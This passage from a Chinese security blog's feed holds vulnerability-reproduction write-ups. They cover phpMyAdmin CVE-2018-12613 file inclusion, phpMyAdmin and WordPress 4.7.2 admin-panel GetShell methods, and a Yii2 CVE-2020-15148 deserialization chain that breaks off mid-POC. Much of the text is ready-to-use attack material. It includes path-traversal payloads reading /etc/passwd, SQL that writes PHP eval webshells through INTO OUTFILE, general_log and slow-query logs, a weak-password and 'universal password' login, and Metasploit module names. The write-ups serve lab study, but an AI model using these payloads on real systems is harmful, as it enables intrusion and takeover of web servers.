61 行</p><p><img src="/../../../../pic/Pasted%20image%2020221231012132.png"></p><p>对 targe 进行了一些过滤，然后将 target 进行包含</p><p>分析下具体过滤内容</p><pre class="line-numbers language-none"><code class="language-none">1. empty() 判断 target 是否为空，不会空则进入2. is_string() 判断 target 是否为字符串，为字符串则进入3. !preg_match() 判断 target 是否以 index 开头，不为 index 开头则进入4. !in_array() 判断 target 是否在指定的黑名单中，不在黑名单中则进入5. Core::checkPageValidity() 判断 target 是否在白名单中，在白名单中则进入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前三个都很容易绕过</p><p>第四个需要绕过黑名单，查看黑名单即可看到过滤掉了两个文件</p><p><img src="/../../../../pic/Pasted%20image%2020221231012915.png"></p><p>第五个需要绕过白名单</p><p><img src="/../../../../pic/Pasted%20image%2020221231013124.png"></p><p>先截取 target 中从开头到 ? 的内容然后进行白名单匹配</p><p>没啥难度</p><p>构造 payload</p><pre class="line-numbers language-none"><code class="language-none">/index.php?target=db_sql.php?/../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221231013431.png"></p><h2 id="漏洞利用-GetShell"><a href="#漏洞利用-GetShell" class="headerlink" title="漏洞利用 GetShell"></a>漏洞利用 GetShell</h2><p>使用的站库分离方式搭建的 phpmyadmin 无法直接通过 SQL 语句进行写入 shell ，可以利用常见的文件包含来 GetShell</p><p>利用 session 写入 shell </p><p>执行 SQL 语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">"&lt;?php phpinfo();?&gt;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看会话的 Cookie</p><p><img src="/../../../../pic/Pasted%20image%2020221231014327.png"></p><p>进入容器中查看一下保存的内容</p><p><img src="/../../../../pic/Pasted%20image%2020221231014425.png"></p><p><img src="/../../../../pic/Pasted%20image%2020221231014459.png"></p><p>已经将内容写入到 session 中，文件包含该 session</p><pre class="line-numbers language-none"><code class="language-none">/index.php?target=db_sql.php?/../../../../../../../../tmp/sess_5e9976fc9ff30e71170eda3cdf92ff75<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221231014556.png"></p><p>成功实现包含，通过 phpinfo 获取到网站路径为 /var/www/html ，进一步写入 shell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">"&lt;?php file_put_contents('/var/www/html/shell.php','&lt;?php eval($_POST[0]);?&gt;');?&gt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次包含 session 后即可写入 shell</p><p><img src="/../../../../pic/Pasted%20image%2020221231014930.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新至最新版</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41924764/article/details/109701126">CVE-2018-12613 PHPmyadmin文件包含漏洞分析及漏洞利用</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPMyAdmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress 4.7.2 后台 GetShell</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/wordpress/wordpress-4.7.2-hou-tai-getshell/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/wordpress/wordpress-4.7.2-hou-tai-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="Wordpress-4-7-2-后台-GetShell"><a href="#Wordpress-4-7-2-后台-GetShell" class="headerlink" title="Wordpress 4.7.2 后台 GetShell"></a>Wordpress 4.7.2 后台 GetShell</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-修改原主题"><a href="#1-修改原主题" class="headerlink" title="1. 修改原主题"></a>1. 修改原主题</h3><p>使用弱口令 admin / 123456 登录进后台</p><p><img src="/../../../../pic/Pasted%20image%2020221227190910.png"></p><p>在外观的编辑页面中可以修改 php 文件的内容，在其中插入一句话木马</p><p>在 index.php 中插入一句话木马</p><p><img src="/../../../../pic/Pasted%20image%2020221227191019.png"></p><p>更新文件后访问主页即可获取到回显结果</p><p><img src="/../../../../pic/Pasted%20image%2020221227191320.png"></p><h3 id="2-上传新主题"><a href="#2-上传新主题" class="headerlink" title="2. 上传新主题"></a>2. 上传新主题</h3><p>获得默认的主题并在其中新加入 webshell 文件 <code>helloword.php</code> </p><p><img src="/../../../../pic/Pasted%20image%2020221227191721.png"></p><p>进入上传功能页面</p><p><img src="/../../../../pic/Pasted%20image%2020221227191746.png"></p><p>上传成功后进行安装</p><p><img src="/../../../../pic/Pasted%20image%2020221227191904.png"></p><p>访问 <code>/wp-content/themes/twentyhello/helloworld.php</code> 获得 shell</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPMyAdmin 后台 GetShell</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/phpmyadmin/phpmyadmin-hou-tai-getshell/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/phpmyadmin/phpmyadmin-hou-tai-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPMyAdmin-后台-GetShell"><a href="#PHPMyAdmin-后台-GetShell" class="headerlink" title="PHPMyAdmin 后台 GetShell"></a>PHPMyAdmin 后台 GetShell</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>phpMyadmin是一个以PHP为基础的MySQL数据库管理工具，使网站管理员可通过Web接口管理数据库。</p><h2 id="1-into-outfile-写马"><a href="#1-into-outfile-写马" class="headerlink" title="1. into outfile 写马"></a>1. into outfile 写马</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><pre class="line-numbers language-none"><code class="language-none">1. 网站真实路径2. secure_file_priv 读写权限secure_file_priv为 null 时，不允许读取任意文件为其余路径时，只能向该路径可以读写文件为空时，允许读写任意文件该选项只有通过配置文件修改后重启服务才生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>先获取到网站的真实路径</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看写文件权限</span><span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span class="token punctuation">;</span><span class="token comment"># 存在写权限的情况下写入 shell</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[0]);?&gt;"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/shell.php"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-日志写马"><a href="#2-日志写马" class="headerlink" title="2. 日志写马"></a>2. 日志写马</h2><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p><h3 id="前置条件-1"><a href="#前置条件-1" class="headerlink" title="前置条件"></a>前置条件</h3><pre class="line-numbers language-none"><code class="language-none">1. 获取网站真实路径general_log      日志保存状态general_log_file 日志保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看general_log 是否开启</span><span class="token keyword">show</span> VARIABLES <span class="token operator">like</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span class="token comment"># 开启</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"ON"</span><span class="token punctuation">;</span><span class="token comment"># 设置保存路径</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'/var/www/html/shell.php'</span><span class="token punctuation">;</span><span class="token comment"># 查询语句保存到 shell</span><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[0]);?&gt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-慢查询写马"><a href="#3-慢查询写马" class="headerlink" title="3. 慢查询写马"></a>3. 慢查询写马</h2><p>慢查询，顾名思义，就是在日志中记录运行比较慢的SQL语句，是指mysql记录所有执行超过long_query_time 参数设定的时间阈值的SQL语句查询。</p><p>慢查询记录在慢查询日志中，通过慢查询日志，可以查找出哪些查询语句的执行效率低，以便进行优化。该日志能为SQL语句的优化带来很好的帮助。</p><p>默认情况下，慢查询日志是关闭的，要使用慢查询日志功能，首先要开启慢查询日志功能。</p><p>和日志写马的方式差不多</p><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow%'</span><span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">'/var/www/html/shell.php'</span><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[0]);?&gt;'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-新表-文件包含"><a href="#4-新表-文件包含" class="headerlink" title="4. 新表+文件包含"></a>4. 新表+文件包含</h2><p>需要结合文件包含使用</p><h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 创建新数据库</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> rce<span class="token punctuation">;</span><span class="token comment"># 使用数据库</span><span class="token keyword">use</span> rce<span class="token punctuation">;</span><span class="token comment"># 创建新表</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> rce<span class="token punctuation">(</span>code <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 插入数据</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> rce<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">"&lt;?php phpinfo();?&gt;"</span><span class="token punctuation">;</span><span class="token comment"># 查询数据库位置</span><span class="token keyword">SELECT</span> @<span class="token variable">@basedir</span><span class="token punctuation">;</span><span class="token comment"># 目标地址即为 @@basedir/data/rce/rce.MYD 或者 frm 中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-特殊版本-GetShell"><a href="#5-特殊版本-GetShell" class="headerlink" title="5. 特殊版本 GetShell"></a>5. 特殊版本 GetShell</h2><h3 id="5-1-CVE-2013-3238"><a href="#5-1-CVE-2013-3238" class="headerlink" title="5.1 CVE-2013-3238"></a>5.1 CVE-2013-3238</h3><pre class="line-numbers language-none"><code class="language-none">影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG利用模块：exploit/multi/http/phpmyadminpregreplace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-2-CVE-2012-5159"><a href="#5-2-CVE-2012-5159" class="headerlink" title="5.2 CVE-2012-5159"></a>5.2 CVE-2012-5159</h3><pre class="line-numbers language-none"><code class="language-none">影响版本：phpMyAdmin v3.5.2.2利用模块：exploit/multi/http/phpmyadmin3522_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-3-CVE-2009-1151"><a href="#5-3-CVE-2009-1151" class="headerlink" title="5.3 CVE-2009-1151"></a>5.3 CVE-2009-1151</h3><pre class="line-numbers language-none"><code class="language-none">PhpMyAdmin配置文件/config/config.inc.php存在命令执行影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1利用模块：exploit/unix/webapp/phpmyadmin_config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-弱口令-amp-万能密码"><a href="#5-4-弱口令-amp-万能密码" class="headerlink" title="5.4 弱口令&amp;万能密码"></a>5.4 弱口令&amp;万能密码</h3><pre class="line-numbers language-none"><code class="language-none">弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码万能密码：版本2.11.3 / 2.11.4，用户名'localhost'@'@"则登录成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6. 参考链接"></a>6. 参考链接</h2><p><a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html?ivk_sa=1024320u">PhpMyAdmin漏洞利用总结</a></p><p><a href="https://cloud.tencent.com/developer/article/1587498">phpMyadmin的GetShell思路</a></p><p><a href="https://blog.csdn.net/YouthBelief/article/details/121274154">phpmyadmin getshell</a></p><p><a href="https://www.php.cn/mysql-tutorials-488947.html#:~:text=%E6%85%A2%E6%9F%A5%E8%AF%A2%EF%BC%8C%E9%A1%BE%E5%90%8D%E6%80%9D%E4%B9%89,SQL%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E3%80%82">什么是 mysql 慢查询</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPMyAdmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yii2 2.0.37 反序列化漏洞</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/yii2/yii2-2.0.37-fan-xu-lie-hua-lou-dong/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/yii2/yii2-2.0.37-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Yii2-2-0-37-反序列化漏洞"><a href="#Yii2-2-0-37-反序列化漏洞" class="headerlink" title="Yii2 2.0.37 反序列化漏洞"></a>Yii2 2.0.37 反序列化漏洞</h1><h2 id="Yii框架"><a href="#Yii框架" class="headerlink" title="Yii框架"></a>Yii框架</h2><p>Yii 是一个适用于开发 Web2.0 应用程序的高性能PHP 框架。</p><p>Yii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。</p><p>Yii 当前有两个主要版本：1.1 和 2.0。 1.1 版是上代的老版本，现在处于维护状态。 2.0 版是一个完全重写的版本，采用了最新的技术和协议，包括依赖包管理器 Composer、PHP 代码规范 PSR、命名空间、Traits（特质）等等。 2.0 版代表新一代框架，是未来几年中我们的主要开发版本。</p><p>Yii 2.0 还使用了 PHP 的最新特性， 例如命名空间 和Trait（特质）</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>yii2.2.0.38之前的版本存在反序列化漏洞，程序在调用unserialize时，攻击者可以通过构造特定的恶意请求执行RCE，CVE编号是CVE-2020-15148.</p><p>2.0.38已修复该漏洞，官方的修复方法：</p><p>在yii\db\BatchQueryResult类增加了一个__wakeup()函数，函数内容为：当BatchQueryResult类被反序列化时直接报错，wakeup()方法在类被反序列化会自动调用，这样也就避免了反序列化的发生，避免了漏洞。</p><p>相关链接：<a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></p><p><img src="/../../../../pic/Pasted%20image%2020221116102907.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本地使用phpstudy搭建，将Yii2的demo下载下来：</p><p><a href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz">https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz</a></p><p>还需要修改 config/web.php 中的 cookieValidationKey 字段</p><p><img src="/../../../../pic/Pasted%20image%2020221116104131.png"></p><p>启动 phpstudy，访问 <a href="http://127.0.0.1/yii2/web/index.php">http://127.0.0.1/yii2/web/index.php</a></p><p><img src="/../../../../pic/Pasted%20image%2020221116104554.png"></p><p>网页环境搭建好了，由于需要进行测试还需要一个反序列化入口点</p><p>controllers/TestController.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据前面 GitHub 的修改记录可知漏洞触发点在 vendor/yiisoft/yii2/db/BatchQueryResult.php 中</p><p>存在 __destruct 函数，应该就是反序列化入口点了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**  * Destructor.  */</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment">// make sure cursor is closed</span>     <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment">/**  * Resets the batch query.  * This method will clean up the existing batch query so that a new batch query can be performed.  */</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_dataReader</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_dataReader</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>     <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_batch</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>     <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>     <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终有用的部分是 <code>$this-&gt;_dataReader-&gt;close();</code> 这一段</p><p>目前已知 <code>$this-&gt;_dataReader</code> 是可控的，所以思路为要么找到一个危险的 <code>close</code> 方法，要么找到一个危险的 <code>__call</code>方法</p><h3 id="POP-链-1"><a href="#POP-链-1" class="headerlink" title="POP 链 1"></a>POP 链 1</h3><p>先开始对 <code>__call</code> 方法下手</p><p>虽然有很多 <code>call_user_func_array</code> ，但是都限制了调用的函数名，没法指定调用其他函数</p><p>最后找到了 <code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * @param string $method * @param array $attributes * * @return mixed */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了 <code>format</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">format</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>getFormatter</code> 方法处理之后调用函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * @param string $formatter * * @return Callable */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">providers</span> <span class="token keyword">as</span> <span class="token variable">$provider</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unknown formatter "%s"'</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到第一个 if 判断中，如果变量 formatters 中存在传入的值（这里为 close）则会将其值返回，而这个变量我们可以控制，也就是说可以在这个地方调用其他的任意函数</p><p>接下来的思路就是寻找一个可以执行命令或写入文件等利用方法的危险函数</p><p>全局搜索 call_user_func</p><p>vendor/yiisoft/yii2/rest/CreateAction.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Creates a new model. * @return \yii\db\ActiveRecordInterface the model newly created * @throws ServerErrorHttpException if there is any error when creating the model */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vendor/yiisoft/yii2/rest/IndexAction.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * @return ActiveDataProvider */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这两个类中的 <code>$this-&gt;checkAccess</code> 与 <code>$this-&gt;id</code> 均可控，可以借此执行任意命令</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>POP 链子</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()↓↓↓Fake\Generator::__call()-&gt;format()-&gt;call_user_func_array↓↓↓yii\rest\IndexAction::run()-&gt;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 POC</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token 